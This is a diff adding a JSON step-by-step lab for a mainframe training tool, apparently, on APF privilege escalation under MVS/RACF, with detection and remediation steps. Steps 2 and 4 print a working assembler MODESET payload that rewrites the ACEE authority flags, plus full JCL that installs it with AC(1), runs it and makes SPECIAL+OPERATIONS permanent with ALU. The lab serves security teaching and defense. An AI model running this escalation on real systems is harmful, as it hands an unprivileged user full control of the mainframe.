@@ -1,0 +1,69 @@
+{
+  "id": "apf-privesc",
+  "title": "APF Privilege Escalation: MODESET to Superuser",
+  "description": "Demonstrate the classic APF privilege escalation attack. Find a writable APF-authorized library, assemble a MODESET program that modifies the ACEE security block, and escalate to SPECIAL+OPERATIONS authority. Based on mainframed/APFPRIV.jcl.",
+  "category": "security",
+  "difficulty": "advanced",
+  "steps": [
+    {
+      "title": "Attack Overview",
+      "screen": "APF Privilege Escalation — The Classic Mainframe Privesc\n\nObjective: Escalate from normal user to RACF SPECIAL+OPERATIONS\nusing only legitimate system functions.\n\nAttack chain:\n  1. Identify APF-authorized libraries\n  2. Find one with UPDATE access\n  3. Assemble a program that uses MODESET KEY=ZERO,MODE=SUP\n  4. The program modifies the ACEE (security control block)\n  5. Sets SPECIAL + OPERATIONS + AUDITOR flags\n  6. Link-edit into the APF library with AC(1)\n  7. Execute — instant superuser\n  8. Run ALU to make it permanent in RACF\n\nThis is the mainframe equivalent of a kernel exploit,\nexcept it uses DOCUMENTED, SUPPORTED system functions.\nMODESET is not a bug — it's a feature for authorized programs.",
+      "expected": "Understand the APF privilege escalation chain before executing it.",
+      "hint": "APF = Authorized Program Facility. Programs in APF libraries can use MODESET to enter supervisor state — the mainframe equivalent of kernel mode."
+    },
+    {
+      "title": "What is APF?",
+      "screen": "APF — Authorized Program Facility\n\nMVS has two execution modes:\n  Problem State (user mode)  — normal programs\n  Supervisor State (kernel)  — OS and authorized programs\n\nAPF controls which programs can use MODESET:\n  1. Program must be in an APF-authorized library\n  2. Program must be link-edited with AC(1)\n  3. All libraries in the STEPLIB must be APF-authorized\n\nIf ALL three conditions are met:\n  The program can call MODESET KEY=ZERO,MODE=SUP\n  → enters supervisor state\n  → can modify ANY control block in memory\n  → including the ACEE (your security profile)\n\nThe vulnerability:\n  If a user can WRITE to an APF library,\n  they can place their own authorized program in it\n  → MODESET → modify ACEE → SPECIAL authority\n  → game over",
+      "expected": "Understand APF authorization and why writable APF libraries are critical.",
+      "hint": "Think of APF like Linux capabilities or Windows SeDebugPrivilege — it grants access to privileged system calls."
+    },
+    {
+      "title": "Step 1: Enumerate APF Libraries",
+      "screen": " READY\n LISTALC STATUS\n --DDNAME   DISP\n   STEPLIB\n            KEEP   SYS1.CMDLIB\n   SYSPROC\n            KEEP   SYSC.CMDPROC\n   SYSEXEC\n            KEEP   SYSC.EXEC\n READY\n\n APF libraries on TK5 (from SYS1.PARMLIB(IEAAPF00)):\n   SYS1.LINKLIB     (system default - always APF)\n   SYS1.SVCLIB      (SVC routines)\n   SYS1.CMDLIB      (TSO commands)\n   SYSC.LINKLIB     (community additions)\n\n Check: Can HERC01 write to any of these?",
+      "expected": "Identify APF-authorized libraries and check which ones HERC01 can write to.",
+      "hint": "On TK5, HERC01 often has OPERATIONS authority, which grants UPDATE access to most datasets. Check with: LISTDS 'SYS1.LINKLIB' and look at the DSORG."
+    },
+    {
+      "title": "Step 2: The Assembler Payload",
+      "screen": "The MODESET Payload (IBM System/370 Assembler)\n\n       CSECT\n       AMODE 31\n       STM 14,12,12(13)       Save registers\n       BALR 12,0               Set base register\n       USING *,12\n       ST 13,SAVE+4\n       LA 13,SAVE\n*\n       MODESET KEY=ZERO,MODE=SUP    ← Enter supervisor state\n*\n       L 5,X'224'             ASCB pointer (PSA)\n       L 5,X'6C'(5)           ASXB pointer\n       L 5,X'C8'(5)           ACEE pointer ← YOUR security profile\n       NI X'26'(5),X'00'      Clear flags byte\n       OI X'26'(5),X'B1'      Set SPECIAL+OPER+AUDITOR\n       NI X'27'(5),X'00'      Clear flags byte 2\n       OI X'27'(5),X'80'      Set ALTER access\n*\n       L 13,SAVE+4\n       LM 14,12,12(13)        Restore registers\n       XR 15,15               RC=0\n       BR 14                  Return\n*\nSAVE   DS 18F\n       END",
+      "expected": "Understand each instruction in the privilege escalation payload.",
+      "hint": "MODESET KEY=ZERO,MODE=SUP is the critical instruction. After that, the program walks the control block chain: PSA → ASCB → ASXB → ACEE, then flips the authority bits."
+    },
+    {
+      "title": "Step 3: The Control Block Chain",
+      "screen": "Control Block Chain: PSA → ASCB → ASXB → ACEE\n\nPSA (Prefixed Save Area) — address 0\n  +X'224' → ASCB (Address Space Control Block)\n\nASCB — describes this address space\n  +X'6C'  → ASXB (Address Space Extension Block)\n\nASXB — extended address space info\n  +X'C8'  → ACEE (Accessor Environment Element)\n\nACEE — YOUR security profile in memory\n  +X'26'  → Authority flags byte 1\n    Bit 0: SPECIAL     (full RACF admin)\n    Bit 2: OPERATIONS  (access all datasets)\n    Bit 4: AUDITOR     (audit authority)\n    Bit 7: (reserved)\n    X'B1' = 10110001 = SPECIAL+OPER+AUDITOR\n\n  +X'27'  → Authority flags byte 2\n    Bit 0: ALTER access to all resources\n    X'80' = 10000000 = ALTER\n\nAfter MODESET + flag modification:\n  You ARE the security administrator.",
+      "expected": "Trace the control block chain from PSA to ACEE and understand the flag bits.",
+      "hint": "The ACEE is created by RACF at logon time. Modifying it in memory gives you the authority immediately — no RACF database change needed (until you run ALU to make it permanent)."
+    },
+    {
+      "title": "Step 4: The Full JCL",
+      "screen": "//APFPRIV  JOB (ACCT),'APF PRIVESC',CLASS=A,\n//         MSGCLASS=X,MSGLEVEL=(1,1),\n//         USER=HERC01,PASSWORD=CUL8TR\n//*\n//SET PROGNAME='PRIVPGM'\n//SET APFDSN='SYSC.LINKLIB'\n//SET USERID=&SYSUID\n//EXPORT SYMLIST=(PROGNAME,APFDSN,USERID)\n//*\n//* Step 1: Assemble + Link-edit into APF library\n//*\n//BUILD   EXEC ASMACL\n//C.SYSLIB  DD DSN=SYS1.SISTMAC1,DISP=SHR\n//          DD DSN=SYS1.MACLIB,DISP=SHR\n//C.SYSIN   DD *\n  [assembler source from previous step]\n/*\n//L.SYSLMOD DD DISP=SHR,DSN=&APFDSN\n//L.SYSIN   DD *\n  SETCODE AC(1)\n  NAME &PROGNAME(R)\n/*\n//* Step 2: Execute the authorized program\n//STEP01 EXEC PGM=&PROGNAME,COND=(0,NE)\n//STEPLIB   DD DSN=&APFDSN,DISP=SHR\n//* Step 3: Make it permanent with ALU\n//STEP02 EXEC PGM=IKJEFT01,COND=(0,NE)\n//SYSTSIN DD *\n ALU &USERID SPECIAL OPERATIONS\n/*\n//SYSIN   DD DUMMY\n//SYSTSPRT DD SYSOUT=*",
+      "expected": "Understand the three-step JCL: assemble → execute → ALU to make permanent.",
+      "hint": "SETCODE AC(1) marks the load module as authorized. IKJEFT01 is the TSO batch processor — ALU (ALTER USER) grants SPECIAL+OPERATIONS permanently in the RACF database."
+    },
+    {
+      "title": "Step 5: Why This Works",
+      "screen": "Why APF Privilege Escalation Works\n\n1. MODESET is a DOCUMENTED macro\n   - Not a bug, not an exploit\n   - Intended for system programs\n   - IBM documentation: 'SC28-1303'\n\n2. APF is the ONLY gate\n   - If you're in an APF library with AC(1)\n   - You can use MODESET. Period.\n   - No additional checks, no prompts\n\n3. The ACEE is in writable memory\n   - Once in supervisor state, all memory is writable\n   - The security profile is just bytes in memory\n   - Change the bytes, change your authority\n\n4. ALU makes it permanent\n   - After in-memory escalation, you have SPECIAL\n   - SPECIAL lets you run ALU (ALTER USER)\n   - ALU writes to the RACF database\n   - Authority persists across logons\n\n5. The only defense: PROTECT APF LIBRARIES\n   - If no one can write to APF libraries → no privesc\n   - On TK5/dev systems: often wide open\n   - In production: this is finding #1 in every assessment",
+      "expected": "Understand why APF privesc is not a vulnerability but an architecture design consequence.",
+      "hint": "The defense is simple: don't let unprivileged users write to APF libraries. But in practice, legacy permissions, developer access, and operational convenience often leave them writable."
+    },
+    {
+      "title": "Step 6: Detection",
+      "screen": "Detection Opportunities\n\n1. SMF Type 30 — Job Execution Record\n   - Records STEPLIB datasets used\n   - Unusual APF library references are suspicious\n\n2. SMF Type 80 — RACF Event Record\n   - ALU command is logged\n   - SPECIAL/OPERATIONS grant is recorded\n\n3. RACF SETROPTS LOGOPTIONS\n   - ALWAYS log access to APF libraries\n   - Monitor UPDATE access to system datasets\n\n4. Integrity Monitoring\n   - Hash/checksum APF library members\n   - Alert on new or modified members\n\n5. RACF PROGRAM Control\n   - Restrict which programs can run from APF libs\n   - Prevents arbitrary code in APF context\n   - RARELY implemented (breaks things)\n\nReality: Most shops don't monitor APF library changes.\nThis attack has been known since the 1980s.\nIt still works in 2025.",
+      "expected": "Identify detection and prevention mechanisms for APF privilege escalation.",
+      "hint": "RACF PROGRAM control is the strongest defense — it restricts which load modules can execute from APF libraries. But it's complex to implement and can break legitimate applications."
+    },
+    {
+      "title": "Step 7: Remediation",
+      "screen": "Remediation Steps\n\n1. Audit APF library access:\n   LISTDS 'SYS1.LINKLIB'\n   LISTDS 'SYSC.LINKLIB'\n   Check RACF profiles: LD 'SYS1.LINKLIB' ALL\n\n2. Restrict UPDATE access:\n   PERMIT 'SYS1.**' CLASS(DATASET) ID(SYSPROG) ACCESS(UPDATE)\n   PERMIT 'SYS1.**' CLASS(DATASET) ID(*) ACCESS(READ)\n\n3. Enable RACF PROGRAM control:\n   SETROPTS WHEN(PROGRAM) — restricts APF execution\n\n4. Monitor SMF records:\n   Type 30 (job execution) — check STEPLIB\n   Type 80 (RACF events) — watch for ALU commands\n\n5. Implement change management:\n   All APF library changes must go through approval\n   Hash-check members before and after maintenance\n\n6. Separate dev and prod APF libraries:\n   Dev systems should NOT share APF libs with prod\n   Different RACF profiles, different access rules\n\nKey insight: If you find a writable APF library\nduring an assessment, the system is compromised.",
+      "expected": "Apply remediation to prevent APF privilege escalation.",
+      "hint": "The single most important control: ensure no unprivileged userid has UPDATE access to any APF-authorized library. This is the #1 finding in mainframe security assessments."
+    },
+    {
+      "title": "Lab Complete",
+      "screen": "APF Privilege Escalation Lab Complete\n\nKey findings:\n- MODESET is a documented system macro, not an exploit\n- APF authorization is the ONLY gate to supervisor state\n- The ACEE (security profile) is modifiable from supervisor\n- Control block chain: PSA → ASCB → ASXB → ACEE\n- SPECIAL+OPERATIONS = full system control\n- ALU makes in-memory escalation permanent\n- Defense: restrict write access to APF libraries\n\nAttack chain:\n  Find writable APF lib → Assemble MODESET program\n  → Link-edit with AC(1) → Execute → Supervisor state\n  → Modify ACEE flags → SPECIAL+OPER+AUDITOR\n  → ALU to make permanent → Full RACF admin\n\nThis attack has been documented since the 1980s.\nIt is still the #1 finding in mainframe assessments.\n\nSource: mainframed/pentesting/APFPRIV.jcl\nCredits: Soldier of FORTRAN (Philip Young)",
+      "expected": "Understand the complete APF privilege escalation attack chain.",
+      "hint": "In a real assessment, you would verify APF library write access BEFORE attempting the escalation. The attack itself takes seconds — the recon takes hours."
+    }
+  ]
+}
